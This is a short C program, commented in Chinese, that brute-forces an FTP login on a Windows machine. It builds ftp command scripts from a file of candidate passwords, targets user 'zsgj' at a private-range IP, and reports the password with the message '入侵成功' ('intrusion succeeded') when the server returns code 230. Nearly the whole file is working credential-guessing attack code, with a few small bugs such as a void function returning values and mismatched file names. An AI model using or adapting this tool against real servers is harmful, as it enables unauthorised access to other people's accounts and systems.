#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<conio.h>
#include<time.h>

#define N 100000

//使用Windows的CMD，ftp一个Linux服务器，用密钥文件去自动尝试密码

/*
	1、 生成格式好的密钥文件
	2、 连接服务器进行比对
	3、 获取结果
*/

//生成100000个随机密码文件
void ranNumber2() {
	FILE* fp = fopen("rp.txt", "w");
	srand((unsigned int)time(NULL));
	for (int i = 0; i < N; i++) {
		fprintf(fp, "%d\n", rand() % 100000);
	}
	fclose(fp);
}

//生成格式好的密钥文件
void createPasswdFile(char* ip, char*pass) {
	/* 生成文件格式
		1、open 192.168.137.134
		2、user
		3、zsgj
		4、passwd
		5、bye
	*/

	FILE* fp2 = fopen("miyao.txt", "w");
	if (!fp2)
		return -1;
	
	fprintf(fp2, "open %s\nuser\nzsgj\n%sbye\n", ip, pass);

	fclose(fp2);
	return 0;
}

int main() {
	//ip地址：192.168.137.134	
	char* ip = "192.168.137.134";
	
	//密码：读取文件，生成好的大量随机密码
	FILE* fp1 = fopen("r.txt", "r");
	if (!fp1)
		return -1;

	char pass[20];

	while (!feof(fp1)) {
		memset(pass, 0, 20);
		fgets(pass, 20, fp1);
		//printf("%s", pass);

		createPasswdFile(ip, pass);
		//接收命令行内容的文件
		FILE* fp3 = _popen("ftp -n -s:D:\\Studies\\C\\test\\vs_test\\Project2\\miyao.txt", "r");
		if (!fp3)
			return -1;
		//将接收的命令行中的的内容转换为日志文件判断不同情况的返回值
		//FILE* fp4 = fopen("log1.txt", "w");
		//if (!fp4)
		//	return -1;

		char buf[1024];

		while (!feof(fp3)) {
			memset(buf, 0, 1024);
			fgets(buf, 1024, fp3);
			//fputs(buf, fp4);
			if (!strncmp("230", buf, 3)) {//根据之前生成的日志文件知有230即密码正确
				printf("入侵成功\n");
				printf("密码为%s\n", pass);
				exit(0);
			}
		}

		_pclose(fp3);
		//fclose(fp4);
	}

	fclose(fp1);
	return 0;
 }